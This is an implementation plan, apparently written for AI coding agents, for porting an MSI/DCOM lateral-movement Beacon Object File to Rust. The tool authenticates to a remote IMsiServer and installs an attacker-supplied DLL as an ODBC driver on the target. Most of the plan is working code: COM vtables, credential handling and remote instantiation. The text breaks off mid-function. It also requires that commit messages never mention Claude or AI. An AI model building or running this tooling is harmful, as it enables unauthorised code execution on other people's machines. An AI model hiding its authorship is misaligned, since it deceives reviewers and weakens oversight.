# letmove_msi Rust BoF Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Port the C BoF `msi_lateral_mv` to a Rust `no_std` BoF named `letmove_msi`, built on the `rustbof` template, reproducing the MSI Server → CreateCustomActionServer → SQLInstallDriverEx lateral-movement technique.

**Architecture:** Standalone Rust crate (`crate-type = "staticlib"`) in `msi_lateral_mv_rs/`, compiled to a static library then linked to a COFF `.o` with `boflink` via `cargo make`. Raw `#[repr(C)]` COM vtables in `no_std`, with `windows-sys` supplying flat Win32/COM APIs. The BoF authenticates to the DCOM `IMsiServer`, spawns a custom-action server, sets DCOM auth on it, then invokes `SQLInstallDriverEx` and `SQLConfigDriver` to install and trigger an attacker-supplied ODBC driver DLL on the target.

**Tech Stack:** Rust nightly, `rustbof`, `windows-sys` 0.59, `boflink`, `cargo-make`.

## Global Constraints

- `no_std` only; no `alloc` outside what `rustbof` provides.
- Crate type: `staticlib`.
- Toolchain: Rust `nightly` via `rust-toolchain.toml`.
- Release profile: `opt-level = "z"`, `codegen-units = 1`, `panic = "abort"`, `strip = true`, `lto = true`.
- Only Beacon-resolvable Win32 symbols (i.e. anything `boflink`/rustbof can dynamically resolve at load time). No standalone CRT calls.
- All user-facing argument strings are wide (`u16` / UTF-16).
- Command name / output artifact: **`letmove_msi`** (not `msi_lateral_mv`).
- Reference source (already cloned at repo root): `msi_lateral_mv/bof/*.c` and `msi_lateral_mv/bof/msilat.h`. Constants, GUIDs, and function-slot ordering MUST be copied verbatim from those files.
- Commits authored as `daniagungg <daniagungg@gmail.com>`; commit messages MUST NOT reference Claude, AI, or any assistant.

---

### Task 1: Scaffold the crate

**Files:**
- Create: `msi_lateral_mv_rs/Cargo.toml`
- Create: `msi_lateral_mv_rs/rust-toolchain.toml`
- Create: `msi_lateral_mv_rs/Makefile.toml`
- Create: `msi_lateral_mv_rs/src/lib.rs`
- Create: `msi_lateral_mv_rs/.gitignore`

**Interfaces:**
- Consumes: nothing.
- Produces: A buildable rustbof project whose `main` is empty. Later tasks add modules and fill `main`.

- [ ] **Step 1: Write `Cargo.toml`**

```toml
[package]
name = "letmove_msi"
version = "0.1.0"
edition = "2024"
authors = ["daniagungg"]
description = "Rust BoF port of msi_lateral_mv — DCOM MSI CustomActionServer lateral movement"
publish = false

[lib]
crate-type = ["staticlib"]

[dependencies.rustbof]
git = "https://github.com/joaoviictorti/rustbof"

[dependencies.windows-sys]
version = "0.59"
features = [
    "Win32_Foundation",
    "Win32_System_Com",
    "Win32_System_Ole",
    "Win32_System_Rpc",
    "Win32_System_LibraryLoader",
    "Win32_System_Environment",
    "Win32_Security_Authentication_Identity",
    "Win32_UI_Shell",
]

[profile.release]
opt-level = "z"
codegen-units = 1
panic = "abort"
strip = true
lto = true
```

- [ ] **Step 2: Write `rust-toolchain.toml`**

```toml
[toolchain]
channel = "nightly"
components = ["rust-src"]
```

- [ ] **Step 3: Write `Makefile.toml`**

Copy from `rustbof/examples/whoami/Makefile.toml` verbatim, then adjust only the artifact name reference if any. Read that file first:

```bash
cat rustbof/examples/whoami/Makefile.toml
```

Write the same content to `msi_lateral_mv_rs/Makefile.toml`. If the file references `whoami`, replace with `letmove_msi`.

- [ ] **Step 4: Write empty `src/lib.rs`**

```rust
#![no_std]

#[rustbof::main]
fn main(_args: *mut u8, _len: usize) {
}
```

- [ ] **Step 5: Write `.gitignore`**

```
/target
Cargo.lock
```

- [ ] **Step 6: Build to prove scaffolding works**

Run: `cd msi_lateral_mv_rs && cargo make`
Expected: build succeeds and produces a `.o` file under `target/`. Run `find target -name 'letmove_msi.o'` to confirm.

- [ ] **Step 7: Commit**

```bash
git add msi_lateral_mv_rs/
git commit -m "feat: scaffold letmove_msi rustbof crate"
```

---

### Task 2: COM vtable + GUID definitions

**Files:**
- Create: `msi_lateral_mv_rs/src/com.rs`
- Modify: `msi_lateral_mv_rs/src/lib.rs` (add `mod com;`)
- Reference (read only): `msi_lateral_mv/bof/msilat.h`, `msi_lateral_mv/bof/bofdefs.h`

**Interfaces:**
- Consumes: nothing.
- Produces:
  - `pub const CLSID_MsiServer: GUID`
  - `pub const IID_IMsiServer: GUID`
  - `pub const CLSID_MSIRemoteApi: GUID`
  - `pub const IID_IMsiRemoteAPI: GUID`
  - `pub const IID_IMsiCustomAction: GUID`
  - `pub const IID_IClassFactory: GUID`
  - `#[repr(C)] pub struct IUnknownVtbl { pub QueryInterface, pub AddRef, pub Release }` (fn pointer fields)
  - `#[repr(C)] pub struct IUnknown { pub lpVtbl: *const IUnknownVtbl }`
  - `#[repr(C)] pub struct IMsiConfigurationManagerVtbl { pub base: IUnknownVtbl, /* correct slot padding + */ pub CreateCustomActionServer: unsafe extern "system" fn(...) -> HRESULT }`
  - `#[repr(C)] pub struct IMsiConfigurationManager { pub lpVtbl: *const IMsiConfigurationManagerVtbl }`
  - `#[repr(C)] pub struct IMsiCustomActionVtbl { pub base: IUnknownVtbl, /* slot padding + */ pub SQLInstallDriverEx, pub SQLConfigDriver, pub SQLInstallerError }`
  - `#[repr(C)] pub struct IMsiCustomAction { pub lpVtbl: *const IMsiCustomActionVtbl }`
  - `#[repr(C)] pub struct IClassFactoryVtbl { pub base: IUnknownVtbl, pub CreateInstance: unsafe extern "system" fn(this: *mut IClassFactory, outer: *mut IUnknown, riid: *const GUID, ppv: *mut *mut core::ffi::c_void) -> HRESULT, pub LockServer }`
  - `#[repr(C)] pub struct IClassFactory { pub lpVtbl: *const IClassFactoryVtbl }`
  - `pub const ICAC64_IMPERSONATED: u32 = <value from msilat.h>`

Every GUID's byte layout, and every vtable slot's ordering + padding, MUST be copied verbatim from `msi_lateral_mv/bof/msilat.h`. Do not invent slot layouts — the C header is the source of truth. If a slot is unused in Rust, still reserve it with a `pub _reservedN: *const core::ffi::c_void` field to keep offsets identical.

- [ ] **Step 1: Read the C header to extract GUIDs and vtable ordering**

```bash
cat msi_lateral_mv/bof/msilat.h
cat msi_lateral_mv/bof/bofdefs.h
```

Note: transcribe every `DEFINE_GUID` (or equivalent) and every vtable struct exactly. `SQLInstallDriverEx`, `SQLConfigDriver`, `SQLInstallerError` slot positions inside `IMsiCustomAction` are especially important — off-by-one there will crash at call time.

- [ ] **Step 2: Write `src/com.rs`**

```rust
use core::ffi::c_void;
use windows_sys::core::{GUID, HRESULT};

// ==== GUIDs (verbatim from msilat.h) ====
pub const CLSID_MsiServer:     GUID = GUID::from_u128(0x_/* fill from msilat.h */);
pub const IID_IMsiServer:      GUID = GUID::from_u128(0x_/* fill from msilat.h */);
pub const CLSID_MSIRemoteApi:  GUID = GUID::from_u128(0x_/* fill from msilat.h */);
pub const IID_IMsiRemoteAPI:   GUID = GUID::from_u128(0x_/* fill from msilat.h */);
pub const IID_IMsiCustomAction:GUID = GUID::from_u128(0x_/* fill from msilat.h */);
pub const IID_IClassFactory:   GUID = GUID::from_u128(0x00000001_0000_0000_C000_000000000046);

pub const ICAC64_IMPERSONATED: u32 = /* value from msilat.h */;

// ==== IUnknown ====
#[repr(C)]
pub struct IUnknownVtbl {
    pub QueryInterface: unsafe extern "system" fn(this: *mut IUnknown, riid: *const GUID, ppv: *mut *mut c_void) -> HRESULT,
    pub AddRef:         unsafe extern "system" fn(this: *mut IUnknown) -> u32,
    pub Release:        unsafe extern "system" fn(this: *mut IUnknown) -> u32,
}

#[repr(C)]
pub struct IUnknown {
    pub lpVtbl: *const IUnknownVtbl,
}

// ==== IClassFactory ====
#[repr(C)]
pub struct IClassFactoryVtbl {
    pub base: IUnknownVtbl,
    pub CreateInstance: unsafe extern "system" fn(this: *mut IClassFactory, outer: *mut IUnknown, riid: *const GUID, ppv: *mut *mut c_void) -> HRESULT,
    pub LockServer:     unsafe extern "system" fn(this: *mut IClassFactory, lock: i32) -> HRESULT,
}
#[repr(C)] pub struct IClassFactory { pub lpVtbl: *const IClassFactoryVtbl }

// ==== IMsiConfigurationManager ====
// Copy every slot from IMsiConfigurationManagerVtbl in msilat.h in the same order,
// using *const c_void for any slot letmove_msi does not call, and a typed fn ptr
// for CreateCustomActionServer.
#[repr(C)]
pub struct IMsiConfigurationManagerVtbl {
    pub base: IUnknownVtbl,
    // <fill: reserved slots between IUnknown and CreateCustomActionServer, in order>
    pub CreateCustomActionServer: unsafe extern "system" fn(
        this: *mut IMsiConfigurationManager,
        iContext: u32,
        clientProcessId: u32,
        pRemApi: *mut IUnknown,
        pvEnvironment: *const u16,
        cbEnvironment: u32,
        dwUnknown: u32,
        rgchCookie: *mut u8,
        pcCookie: *mut i32,
        ppMsiCustomAction: *mut *mut IMsiCustomAction,
        pdwServerPid: *mut u32,
        bUnknownFalse: i32,
    ) -> HRESULT,
    // <fill: any trailing reserved slots to match C layout>
}
#[repr(C)] pub struct IMsiConfigurationManager { pub lpVtbl: *const IMsiConfigurationManagerVtbl }

// ==== IMsiCustomAction ====
#[repr(C)]
pub struct IMsiCustomActionVtbl {
    pub base: IUnknownVtbl,
    // <fill: reserved slots between IUnknown and SQLInstallDriverEx, in order>
    pub SQLInstallDriverEx: unsafe extern "system" fn(
        this: *mut IMsiCustomAction,
        cDrvLen: i32,
        szDriver: *const u16,
        szPathIn: *const u16,
        szPathOut: *mut u16,
        cbPathOutMax: u16,
        pcbPathOut: *mut u16,
        fRequest: u16,
        pdwUsageCount: *mut u32,
        rawReturnCode: *mut i32,
    ) -> HRESULT,
    pub SQLConfigDriver: unsafe extern "system" fn(
        this: *mut IMsiCustomAction,
        fRequest: u16,
        szDriver: *const u16,
        szArgs: *const u16,
        szMsg: *mut u16,
        cbMsgMax: u16,
        pcbMsgOut: *mut u16,
        configResult: *mut i32,
    ) -> HRESULT,
    pub SQLInstallerError: unsafe extern "system" fn(
        this: *mut IMsiCustomAction,
        iError: u16,
        pfErrorCode: *mut u32,
        szErrorMsg: *mut u16,
        cbErrorMsgMax: u16,
        pcbErrorMsg: *mut u16,
    ) -> HRESULT,
    // <fill: any trailing slots>
}
#[repr(C)] pub struct IMsiCustomAction { pub lpVtbl: *const IMsiCustomActionVtbl }
```

The `<fill>` markers must be resolved against `msilat.h` before compile. Do not leave literal `<fill>` in the finished file.

- [ ] **Step 3: Wire the module**

Edit `src/lib.rs`:

```rust
#![no_std]

mod com;

#[rustbof::main]
fn main(_args: *mut u8, _len: usize) {
}
```

- [ ] **Step 4: Build**

Run: `cd msi_lateral_mv_rs && cargo make`
Expected: build succeeds. No dead-code warnings suppress needed — module is `pub`-used via later tasks.

- [ ] **Step 5: Commit**

```bash
git add msi_lateral_mv_rs/src/com.rs msi_lateral_mv_rs/src/lib.rs
git commit -m "feat(com): add MSI COM vtables and GUIDs"
```

---

### Task 3: Argument parsing

**Files:**
- Create: `msi_lateral_mv_rs/src/args.rs`
- Modify: `msi_lateral_mv_rs/src/lib.rs` (add `mod args;` and call parser in `main`)

**Interfaces:**
- Consumes: `rustbof::data::DataParser`.
- Produces:
  - `pub enum Mode { Local, Remote }`
  - `pub struct WStr(pub &'static [u16])` — thin wrapper over a NUL-terminated wide slice taken from BoF arg buffer. Since args live in the BoF's arg blob for the duration of `main`, `'static` here is a lie — but `no_std` and single-shot execution make it safe in practice. Store as `*const u16` + length instead if the borrow checker fights back.
  - `pub struct Args { pub mode: Mode, pub host: Option<*const u16>, pub domain: Option<*const u16>, pub user: Option<*const u16>, pub pass: Option<*const u16>, pub driver: *const u16, pub dll: *const u16 }`
  - `pub fn parse(args: *mut u8, len: usize) -> Option<Args>`
  - `pub fn print_usage()` — prints the accepted syntax via `rustbof::eprintln!`.

The argument protocol on the wire is a sequence of length-prefixed wide strings (rustbof `DataParser::get_wstr()`), in this fixed order:
1. `mode` — `"local"` or `"remote"`
2. `host` — wide string (empty for local)
3. `domain` — wide string (empty if none)
4. `user` — wide string (empty if none)
5. `pass` — wide string (empty if none)
6. `driver` — wide string, required
7. `dll` — wide string, required

Aggressor/CNA on the operator side is responsible for packing empty strings for absent flags. This keeps parsing linear and avoids reinventing flag parsing in `no_std`.

- [ ] **Step 1: Write `src/args.rs`**

```rust
use rustbof::data::DataParser;
use rustbof::eprintln;

#[derive(Clone, Copy, PartialEq, Eq)]
pub enum Mode { Local, Remote }

pub struct Args {
    pub mode: Mode,
    pub host:   Option<*const u16>,
    pub domain: Option<*const u16>,
    pub user:   Option<*const u16>,
    pub pass:   Option<*const u16>,
    pub driver: *const u16,
    pub dll:    *const u16,
}

fn opt(ptr: *const u16) -> Option<*const u16> {
    if ptr.is_null() { return None; }
    unsafe { if *ptr == 0 { None } else { Some(ptr) } }
}

fn wstr_eq_ascii(mut w: *const u16, s: &[u8]) -> bool {
    if w.is_null() { return false; }
    unsafe {
        for &c in s {
            if *w as u8 != c { return false; }
            w = w.add(1);
        }
        *w == 0
    }
}

pub fn print_usage() {
    eprintln!("Usage: letmove_msi <local|remote> <host> <domain> <user> <pass> <driver> <dll>");
    eprintln!("       (empty wide string \"\" for absent host/domain/user/pass)");
}

pub fn parse(args: *mut u8, len: usize) -> Option<Args> {
    let mut p = DataParser::new(args, len);

    let mode_str = p.get_wstr();
    let host     = p.get_wstr();
    let domain   = p.get_wstr();
    let user     = p.get_wstr();
    let pass     = p.get_wstr();
    let driver   = p.get_wstr();
    let dll      = p.get_wstr();

    let mode = if wstr_eq_ascii(mode_str, b"local") { Mode::Local }
               else if wstr_eq_ascii(mode_str, b"remote") { Mode::Remote }
               else { print_usage(); return None; };

    if driver.is_null() || unsafe { *driver } == 0 { print_usage(); return None; }
    if dll.is_null()    || unsafe { *dll }    == 0 { print_usage(); return None; }
    if mode == Mode::Remote && opt(host).is_none() {
        eprintln!("[!] remote mode requires host");
        return None;
    }

    // user+pass must appear together
    let has_user = opt(user).is_some();
    let has_pass = opt(pass).is_some();
    if has_user != has_pass {
        eprintln!("[!] user and pass must be given together");
        return None;
    }
    // domain without user is nonsense
    if opt(domain).is_some() && !has_user {
        eprintln!("[!] domain requires user+pass");
        return None;
    }

    Some(Args {
        mode,
        host:   opt(host),
        domain: opt(domain),
        user:   opt(user),
        pass:   opt(pass),
        driver,
        dll,
    })
}
```

Signature note: `DataParser::get_wstr()` in rustbof returns `*const u16` (verify against `rustbof/crates/rustbof/src/data.rs` before finalizing; if the actual return type differs, adapt the wrappers — do not change the interface promised above).

- [ ] **Step 2: Verify DataParser API**

Run: `grep -n "get_wstr\|pub fn get_" rustbof/crates/rustbof/src/data.rs`
Expected: A method named `get_wstr` or similar returning a wide-string pointer. If it returns `&[u16]` or a different type, adjust `args.rs` accordingly (change field types on `Args` and the `opt`/`wstr_eq_ascii` helpers to match) before proceeding. Preserve the same `Args` field *names* so downstream tasks compile.

- [ ] **Step 3: Wire into lib.rs**

```rust
#![no_std]

mod args;
mod com;

use rustbof::println;

#[rustbof::main]
fn main(raw: *mut u8, len: usize) {
    let Some(a) = args::parse(raw, len) else { return };
    let mode_s = match a.mode { args::Mode::Local => "local", args::Mode::Remote => "remote" };
    println!("[+] letmove_msi: mode={}, driver + dll parsed OK", mode_s);
    let _ = a; // silence unused for now
}
```

- [ ] **Step 4: Build**

Run: `cd msi_lateral_mv_rs && cargo make`
Expected: build succeeds.

- [ ] **Step 5: Commit**

```bash
git add msi_lateral_mv_rs/src/args.rs msi_lateral_mv_rs/src/lib.rs
git commit -m "feat(args): parse wide-string BoF arguments"
```

---

### Task 4: Auth builder + COM security setup

**Files:**
- Create: `msi_lateral_mv_rs/src/auth.rs`
- Modify: `msi_lateral_mv_rs/src/lib.rs` (add `mod auth;`)
- Reference (read only): `msi_lateral_mv/bof/msi_lateral_mv.c` (function `set_auth`), `msi_lateral_mv/bof/comstuff.c` (helper `SetupAuthOnParentIUnknownCastToIID`).

**Interfaces:**
- Consumes: `com::IUnknown`, `windows-sys` COM auth types.
- Produces:
  - `#[repr(C)] pub struct AuthBundle { pub auth_info: COAUTHINFO, pub auth_id: COAUTHIDENTITY }` — heap-free, owned by caller as a local.
  - `pub fn build(domain: Option<*const u16>, user: Option<*const u16>, pass: Option<*const u16>) -> AuthBundle`
  - `pub unsafe fn init_com_security(bundle: &AuthBundle) -> HRESULT` — wraps `CoInitializeSecurity` with a `SOLE_AUTHENTICATION_LIST` built from the bundle.
  - `pub unsafe fn setup_auth_on_iunknown(parent: *mut IUnknown, bundle: &AuthBundle, iid: *const GUID) -> Result<*mut IUnknown, HRESULT>` — reproduces `SetupAuthOnParentIUnknownCastToIID`: `QueryInterface(parent, iid, &out)` then `CoSetProxyBlanket(out, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, bundle.auth_info.dwAuthnLevel, bundle.auth_info.dwImpersonationLevel, &bundle.auth_id_if_present, EOAC_DEFAULT)`.

`AuthBundle` stores the identity struct inline; `auth_info.pAuthIdentityData` is `NULL` when caller passes all-None (current-user path), else it points into `auth_id` field of the same bundle. Callers keep `bundle` alive for the duration of the COM session.

- [ ] **Step 1: Read the C originals**

```bash
sed -n '9,52p'  msi_lateral_mv/bof/msi_lateral_mv.c
cat msi_lateral_mv/bof/comstuff.c
```

Note exact values: `dwAuthnSvc = RPC_C_AUTHN_WINNT`, `dwAuthzSvc = RPC_C_AUTHZ_NONE`, `dwAuthnLevel = RPC_C_AUTHN_LEVEL_PKT_INTEGRITY`, `dwImpersonationLevel = RPC_C_IMP_LEVEL_IMPERSONATE`, `Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE`, `dwCapabilities = EOAC_NONE`. Replicate exactly.

- [ ] **Step 2: Write `src/auth.rs`**

```rust
use core::ptr::{null, null_mut};
use windows_sys::core::{GUID, HRESULT};
use windows_sys::Win32::System::Com::{
    CoInitializeSecurity, CoSetProxyBlanket, COAUTHIDENTITY,
    COAUTHINFO, EOAC_NONE, EOAC_DEFAULT, RPC_C_AUTHN_LEVEL_PKT_INTEGRITY,
    RPC_C_IMP_LEVEL_IMPERSONATE, SOLE_AUTHENTICATION_INFO,
    SOLE_AUTHENTICATION_LIST,
};
use windows_sys::Win32::System::Rpc::{RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE};
use windows_sys::Win32::Security::Authentication::Identity::SEC_WINNT_AUTH_IDENTITY_UNICODE;

use crate::com::IUnknown;

#[repr(C)]
pub struct AuthBundle {
    pub auth_info: COAUTHINFO,
    pub auth_id:   COAUTHIDENTITY,
    pub has_ident: bool,
}

unsafe fn wlen(mut p: *const u16) -> u32 {
    if p.is_null() { return 0; }
    let mut n = 0u32;
    while *p != 0 { n += 1; p = p.add(1); }
    n
}

pub fn build(
    domain: Option<*const u16>,
    user:   Option<*const u16>,
    pass:   Option<*const u16>,
) -> AuthBundle {
    let mut b: AuthBundle = unsafe { core::mem::zeroed() };
    if let Some(u) = user {
        unsafe {
            b.auth_id.User         = u as *mut u16;
            b.auth_id.UserLength   = wlen(u);
            if let Some(p) = pass {
                b.auth_id.Password       = p as *mut u16;
                b.auth_id.PasswordLength = wlen(p);
            }
            if let Some(d) = domain {
                b.auth_id.Domain       = d as *mut u16;
                b.auth_id.DomainLength = wlen(d);
            }
            b.auth_id.Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;
            b.has_ident = true;
        }
    }
    b.auth_info.dwAuthnSvc          = RPC_C_AUTHN_WINNT as u32;
    b.auth_info.dwAuthzSvc          = RPC_C_AUTHZ_NONE as u32;
    b.auth_info.pwszServerPrincName = null_mut();
    b.auth_info.dwAuthnLevel        = RPC_C_AUTHN_LEVEL_PKT_INTEGRITY as u32;
    b.auth_info.dwImpersonationLevel= RPC_C_IMP_LEVEL_IMPERSONATE as u32;
    b.auth_info.pAuthIdentityData   = if b.has_ident {
        &b.auth_id as *const _ as *mut _
    } else { null_mut() };
    b.auth_info.dwCapabilities      = EOAC_NONE as u32;
    b
}

pub unsafe fn init_com_security(bundle: &AuthBundle) -> HRESULT {
    let mut sai: SOLE_AUTHENTICATION_INFO = core::mem::zeroed();
    sai.dwAuthnSvc = bundle.auth_info.dwAuthnSvc;
    sai.dwAuthzSvc = bundle.auth_info.dwAuthzSvc;
    sai.pAuthInfo  = bundle.auth_info.pAuthIdentityData as *mut _;

    let sal = SOLE_AUTHENTICATION_LIST {
        cAuthInfo: 1,
        aAuthInfo: &sai as *const _ as *mut _,
    };

    CoInitializeSecurity(
        null(),
        -1,
        null_mut(),
        null_mut(),
        bundle.auth_info.dwAuthnLevel,
        bundle.auth_info.dwImpersonationLevel,
        &sal as *const _ as *mut _,
        EOAC_NONE as u32,
        null_mut(),
    )
}

pub unsafe fn setup_auth_on_iunknown(
    parent: *mut IUnknown,
    bundle: &AuthBundle,
    iid: *const GUID,
) -> Result<*mut IUnknown, HRESULT> {
    let mut out: *mut IUnknown = null_mut();
    let hr = ((*(*parent).lpVtbl).QueryInterface)(parent, iid, &mut out as *mut _ as *mut _);
    if hr < 0 || out.is_null() { return Err(hr); }

    let hr = CoSetProxyBlanket(
        out as *mut _,
        RPC_C_AUTHN_WINNT as u32,
        RPC_C_AUTHZ_NONE as u32,
        null_mut(),
        bundle.auth_info.dwAuthnLevel,
        bundle.auth_info.dwImpersonationLevel,
        bundle.auth_info.pAuthIdentityData as *mut _,
        EOAC_DEFAULT as u32,
    );
    if hr < 0 {
        ((*(*out).lpVtbl).Release)(out);
        return Err(hr);
    }
    Ok(out)
}
```

Windows-sys type/const names may differ slightly across feature-set versions; if a name mismatches, look it up in `windows-sys` docs and adjust *only* the import, never the values.

- [ ] **Step 3: Wire module**

Edit `src/lib.rs`:

```rust
#![no_std]

mod args;
mod auth;
mod com;

#[rustbof::main]
fn main(raw: *mut u8, len: usize) {
    let Some(_a) = args::parse(raw, len) else { return };
}
```

- [ ] **Step 4: Build**

Run: `cd msi_lateral_mv_rs && cargo make`
Expected: build succeeds.

- [ ] **Step 5: Commit**

```bash
git add msi_lateral_mv_rs/src/auth.rs msi_lateral_mv_rs/src/lib.rs
git commit -m "feat(auth): build COAUTHINFO and proxy blanket helpers"
```

---

### Task 5: MsiServer bring-up

**Files:**
- Create: `msi_lateral_mv_rs/src/msi.rs`
- Modify: `msi_lateral_mv_rs/src/lib.rs` (add `mod msi;`, drive main)
- Reference (read only): `msi_lateral_mv/bof/msilat.c` fn `auth_msi_server`.

**Interfaces:**
- Consumes: `com::*`, `auth::*`.
- Produces:
  - `pub unsafe fn auth_msi_server(bundle: &auth::AuthBundle, host: Option<*const u16>) -> Result<*mut com::IUnknown, HRESULT>`

The function replays `msilat.c::auth_msi_server` exactly:
- Choose `CLSCTX_LOCAL_SERVER` when `host.is_none()`, else `CLSCTX_REMOTE_SERVER`.
- `CoInitialize(NULL)` first (return-value ignored per the C code's soft-warning pattern; we still print if it fails).
- `auth::init_com_security(bundle)` — fail if negative.
- Build `COSERVERINFO` only for remote path (`pwszName = host`, `pAuthInfo = &bundle.auth_info`).
- Build a single `MULTI_QI { pIID: &IID_IMsiServer, pItf: null, hr: 0 }`.
- `CoCreateInstanceEx(&CLSID_MsiServer, NULL, dwClsCtx, server_info_or_null, 1, &qi)`.
- On local: return `qi.pItf` directly after an extra `AddRef` (mirroring the C).
- On remote: `auth::setup_auth_on_iunknown(qi.pItf, bundle, &IID_IMsiServer)` and return the resulting pointer; release the original `qi.pItf`.

- [ ] **Step 1: Read C reference**

```bash
sed -n '77,158p' msi_lateral_mv/bof/msilat.c
```

- [ ] **Step 2: Write `src/msi.rs`**

```rust
use core::ptr::{null, null_mut};
use windows_sys::core::HRESULT;
use windows_sys::Win32::System::Com::{
    CoCreateInstanceEx, CoInitialize, CLSCTX_LOCAL_SERVER, CLSCTX_REMOTE_SERVER,
    COSERVERINFO, MULTI_QI,
};

use rustbof::{eprintln, println};

use crate::auth::{self, AuthBundle};
use crate::com::{IUnknown, CLSID_MsiServer, IID_IMsiServer};

pub unsafe fn auth_msi_server(
    bundle: &AuthBundle,
    host: Option<*const u16>,
) -> Result<*mut IUnknown, HRESULT> {
    let ctx = if host.is_some() { CLSCTX_REMOTE_SERVER } else { CLSCTX_LOCAL_SERVER };

    let hr = CoInitialize(null());
    if hr < 0 { eprintln!("[!] CoInitialize failed: 0x{:08X}", hr as u32); }

    let hr = auth::init_com_security(bundle);
    if hr < 0 {
        eprintln!("[!] CoInitializeSecurity failed: 0x{:08X}", hr as u32);
        return Err(hr);
    }

    let mut server_info: COSERVERINFO = core::mem::zeroed();
    let p_server_info: *mut COSERVERINFO = if let Some(h) = host {
        server_info.pwszName  = h as *mut u16;
        server_info.pAuthInfo = &bundle.auth_info as *const _ as *mut _;
        &mut server_info
    } else { null_mut() };

    let mut qi: MULTI_QI = core::mem::zeroed();
    qi.pIID = &IID_IMsiServer;

    let hr = CoCreateInstanceEx(&CLSID_MsiServer, null_mut(), ctx as u32, p_server_info, 1, &mut qi);
    if hr < 0 { eprintln!("[!] CoCreateInstanceEx: 0x{:08X}", hr as u32); return Err(hr); }
    if qi.hr < 0 { eprintln!("[!] QI IMsiServer: 0x{:08X}", qi.hr as u32); return Err(qi.hr); }

    let p_msi_server = qi.pItf as *mut IUnknown;
    println!("[+] Got IMsiServer @ {:p}", p_msi_server);

    if host.is_some() {
        let authd = auth::setup_auth_on_iunknown(p_msi_server, bundle, &IID_IMsiServer);
        ((*(*p_msi_server).lpVtbl).Release)(p_msi_server);
        authd
    } else {
        ((*(*p_msi_server).lpVtbl).AddRef)(p_msi_server);
        let out = p_msi_server;
        ((*(*p_msi_server).lpVtbl).Release)(p_msi_server);
        Ok(out)
    }
}
```

- [ ] **Step 3: Wire into `lib.rs`**

```rust
#![no_std]

mod args;
mod auth;
mod com;
mod msi;

use rustbof::{eprintln, println};
use windows_sys::Win32::System::Com::CoUninitialize;

#[rustbof::main]
fn main(raw: *mut u8, len: usize) {
    let Some(a) = args::parse(raw, len) else { return };
    let bundle = auth::build(a.domain, a.user, a.pass);

    unsafe {
        let server = match msi::auth_msi_server(&bundle, a.host) {
            Ok(p) => p,
            Err(hr) => { eprintln!("[!] auth_msi_server: 0x{:08X}", hr as u32); CoUninitialize(); return; }
        };
        println!("[+] MsiServer authed @ {:p}", server);
        ((*(*server).lpVtbl).Release)(server);
        CoUninitialize();
    }
}
```

- [ ] **Step 4: Build**

Run: `cd msi_lateral_mv_rs && cargo make`
Expected: build succeeds.

- [ ] **Step 5: Commit**

```bash
git add msi_lateral_mv_rs/src/msi.rs msi_lateral_mv_rs/src/lib.rs
git commit -m "feat(msi): connect and authenticate IMsiServer over DCOM"
```

---

### Task 6: CustomActionServer creation

**Files:**
- Modify: `msi_lateral_mv_rs/src/msi.rs`
- Reference (read only): `msi_lateral_mv/bof/msilat.c` fn `get_custom_action_server`, `msi_lateral_mv/bof/utils.c` (helpers `CreateObjectFromDllFactory`, `GetEnvironmentSizeW`).

**Interfaces:**
- Consumes: `com::*`, `auth::*`, `windows-sys` `LoadLibraryW`/`GetProcAddress`/`GetEnvironmentStringsW`/`FreeEnvironmentStringsW`.
- Produces:
  - `pub unsafe fn get_custom_action_server(server: *mut IUnknown, bundle: &AuthBundle) -> Result<*mut IMsiCustomAction, HRESULT>`
  - `unsafe fn create_object_from_dll_factory(hmod: HMODULE, clsid: *const GUID, iid: *const GUID) -> *mut IUnknown` — resolve `DllGetClassObject` via `GetProcAddress`, call it for `IID_IClassFactory`, then `CreateInstance(NULL, iid)`.
  - `unsafe fn env_size_wide(p: *const u16) -> u32` — walks the env block (double-NUL terminator).

Layout hazard: `CreateCustomActionServer`'s parameter tuple must be identical to the vtable slot signature declared in Task 2. If there's disagreement, fix the vtable (Task 2 output), not this call site.

- [ ] **Step 1: Read C references**

```bash
sed -n '11,75p' msi_lateral_mv/bof/msilat.c
cat msi_lateral_mv/bof/utils.c
```

- [ ] **Step 2: Extend `src/msi.rs`**

Append (do not replace) after `auth_msi_server`:

```rust
use core::ffi::c_void;
use windows_sys::Win32::Foundation::{FALSE, HMODULE};
use windows_sys::Win32::System::Environment::{FreeEnvironmentStringsW, GetEnvironmentStringsW};
use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryW};
use windows_sys::core::{GUID, PCSTR};

use crate::com::{
    IClassFactory, IMsiConfigurationManager, IMsiCustomAction,
    CLSID_MSIRemoteApi, ICAC64_IMPERSONATED, IID_IClassFactory,
    IID_IMsiCustomAction, IID_IMsiRemoteAPI,
};

const COOKIE_SIZE: usize = 32;

type DllGetClassObjectFn = unsafe extern "system" fn(
    rclsid: *const GUID, riid: *const GUID, ppv: *mut *mut c_void,
) -> HRESULT;

unsafe fn env_size_wide(mut p: *const u16) -> u32 {
    if p.is_null() { return 0; }
    let start = p;
    loop {
        if *p == 0 && *p.add(1) == 0 { break; }
        p = p.add(1);
    }
    // include the double NUL, two u16s = 4 bytes
    ((p.offset_from(start) as u32) + 2) * 2
}

unsafe fn create_object_from_dll_factory(
    hmod: HMODULE, clsid: *const GUID, iid: *const GUID,
) -> *mut IUnknown {
    if hmod.is_null() { return core::ptr::null_mut(); }
    let proc = GetProcAddress(hmod, b"DllGetClassObject\0".as_ptr() as PCSTR);
    let Some(proc) = proc else { return core::ptr::null_mut(); };
    let get: DllGetClassObjectFn = core::mem::transmute(proc);

    let mut factory: *mut IClassFactory = core::ptr::null_mut();
    let hr = get(clsid, &IID_IClassFactory, &mut factory as *mut _ as *mut _);
    if hr < 0 || factory.is_null() { return core::ptr::null_mut(); }

    let mut obj: *mut IUnknown = core::ptr::null_mut();
    let hr = ((*(*factory).lpVtbl).CreateInstance)(factory, core::ptr::null_mut(), iid, &mut obj as *mut _ as *mut _);
    ((*(*factory).lpVtbl).base.Release)(factory as *mut IUnknown);
    if hr < 0 { return core::ptr::null_mut(); }
    obj
}

pub unsafe fn get_custom_action_server(
    server: *mut IUnknown,
